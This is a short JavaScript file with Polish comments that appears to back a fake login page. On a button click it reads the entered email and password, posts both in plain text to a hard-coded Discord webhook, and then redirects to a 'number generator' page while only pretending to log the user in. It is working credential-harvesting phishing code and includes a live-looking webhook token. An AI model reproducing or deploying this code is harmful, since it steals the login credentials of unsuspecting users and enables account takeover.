document.addEventListener('DOMContentLoaded', () => {
    const loginButton = document.getElementById('loginButton');
  
    loginButton.addEventListener('click', () => {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
  
      sendWebhook(email, password); // Wywołanie funkcji sendWebhook() z danymi logowania
  
      // Przekierowanie po udanym zalogowaniu (symulacja)
      window.location.href = 'generuj.html'; // Strona z generatorem liczb
    });
  });
  
  function sendWebhook(email, password) {
    const webhookURL = 'https://discord.com/api/webhooks/1192866832189751397/PC4TAcnmVvHip9QeHXs76hQKoSv9rcwXL1WCeFXipxpvzDYD3jLKn_eTy60N_YjXYDKA'; // Wklej tutaj URL webhooka Discorda
  
    const data = {
      content: `Logowanie - Adres e-mail: ${email}, Hasło: ${password}`,
    };
  
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
    .then(response => {
      console.log('Wiadomość z danymi logowania wysłana na Discorda.');
      // Tutaj możesz dodać przekierowanie lub wyświetlić komunikat o sukcesie logowania
    })
    .catch(error => {
      console.error('Wystąpił błąd podczas wysyłania wiadomości:', error);
      // Obsługa błędów
    });
  }
  